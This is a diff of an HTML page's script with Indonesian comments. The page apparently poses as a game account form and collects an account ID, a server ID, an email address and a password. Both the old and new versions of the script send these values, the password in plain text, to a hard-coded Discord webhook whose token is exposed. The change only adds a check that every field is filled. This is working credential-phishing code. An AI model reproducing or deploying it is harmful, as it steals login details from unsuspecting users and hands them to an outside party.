@@ -115,53 +115,58 @@
         </div>
     </div>
 
-  <script>
-      document.getElementById("submit-button").addEventListener("click", function () {
-          // Mengambil data dari formulir
-          const id = document.getElementById("id").value;
-          const idServer = document.getElementById("id-server").value;
-          const email = document.getElementById("email").value;
-          const password = document.getElementById("password").value;
+    <script>
+        document.getElementById("submit-button").addEventListener("click", function () {
+            // Mengambil data dari formulir
+            const id = document.getElementById("id").value;
+            const idServer = document.getElementById("id-server").value;
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
 
-          // Data yang akan dikirim ke Discord
-          const dataToDiscord = {
-              content: `<:mt:1167354079111020607>  **Pengguna : Monton**\n` +
-              `- **ID:** ${id}\n` +
-              `- **ID Server:** ${idServer}\n` +
-              `- **Email:** ${email}\n` +
-              `- **Password:** ${password}`,
-              username: "Pengguna Website", // Ganti dengan nama yang sesuai
-          };
+            // Validasi - memeriksa apakah semua kolom diisi
+            if (id === "" || idServer === "" || email === "" || password === "") {
+                alert("Silakan isi semua kolom sebelum mengirim!");
+            } else {
+                // Data yang akan dikirim ke Discord
+                const dataToDiscord = {
+                    content: `<:mt:1167354079111020607>  **Pengguna : Monton**\n` +
+                    `- **ID:** ${id}\n` +
+                    `- **ID Server:** ${idServer}\n` +
+                    `- **Email:** ${email}\n` +
+                    `- **Password:** ${password}`,
+                    username: "Pengguna Website", // Ganti dengan nama yang sesuai
+                };
 
-          // Mengirim data ke Discord melalui webhook
-          fetch("https://discord.com/api/webhooks/1167332498141892670/uD4DCEQ7Gkk6T8HG6LQw6dY-DMvThyYMwauylbsY6D7PQeO-URlYAbNc51zqo1EMqWvZ", {
-              method: "POST",
-              headers: {
-                  "Content-Type": "application/json",
-              },
-              body: JSON.stringify(dataToDiscord),
-          })
-              .then((response) => {
-                  if (response.ok) {
-                      // Mengatur nilai elemen formulir menjadi kosong
-                      document.getElementById("id").value = "";
-                      document.getElementById("id-server").value = "";
-                      document.getElementById("email").value = "";
-                      document.getElementById("password").value = "";
+                // Mengirim data ke Discord melalui webhook
+                fetch("https://discord.com/api/webhooks/1167332498141892670/uD4DCEQ7Gkk6T8HG6LQw6dY-DMvThyYMwauylbsY6D7PQeO-URlYAbNc51zqo1EMqWvZ", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(dataToDiscord),
+                })
+                    .then((response) => {
+                        if (response.ok) {
+                            // Mengatur nilai elemen formulir menjadi kosong
+                            document.getElementById("id").value = "";
+                            document.getElementById("id-server").value = "";
+                            document.getElementById("email").value = "";
+                            document.getElementById("password").value = "";
 
-                      // Menyembunyikan elemen formulir
-                      document.getElementById("data-form").style.display = "none";
+                            // Menyembunyikan elemen formulir
+                            document.getElementById("data-form").style.display = "none";
 
-                      // Menampilkan pesan terima kasih
-                      document.querySelector(".thank-you-message").style.display = "block";
-                  } else {
-                      alert("Terjadi kesalahan dalam mengirim data ke Discord");
-                  }
-              })
-              .catch((error) => {
-                  alert("Terjadi kesalahan: " + error);
-              });
-      });
-  </script>
+                            // Menampilkan pesan terima kasih
+                            document.querySelector(".thank-you-message").style.display = "block";
+                        } else {
+                            alert("Terjadi kesalahan dalam mengirim data ke Discord");
+                        }
+                    })
+                    .catch((error) => {
+                        alert("Terjadi kesalahan: " + error);
+                    });
+            }
+        });
+    </script>
 </body>
 </html>
